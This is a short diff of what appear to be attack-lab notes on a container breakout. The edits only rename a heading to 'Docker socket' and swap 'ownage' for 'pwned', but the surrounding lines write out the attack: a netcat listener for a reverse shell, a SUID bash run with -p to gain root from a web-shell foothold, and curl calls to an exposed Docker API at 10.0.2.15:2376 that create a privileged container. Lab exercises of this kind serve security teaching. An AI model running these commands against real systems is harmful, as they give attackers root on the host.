@@ -8,7 +8,7 @@ apt-get install iputils-ping
 ```
 
 
-## Attack 2
+## Attack 2 - Docker socket
 ```
 # starts the first container
 docker run -it -d alpine
@@ -58,7 +58,7 @@ nc -lvp 4567
 www-data@a9a295f285de:/var/www/html/vulnerabilities/exec$ /bin/bashroot -p
 /bin/bashroot -p # won't work without -p
 whoami
-root # ownage!
+root # pwned!
 curl http://10.0.2.15:2376/containers/json # check container list
 # Start an easy to hack privileged container
 curl --header "Content-Type: application/json" --request POST --data '{"Image": "alpine", "Cmd": ["sleep", "600"], "Privileged": true}' http://10.0.2.15:2376/containers/create
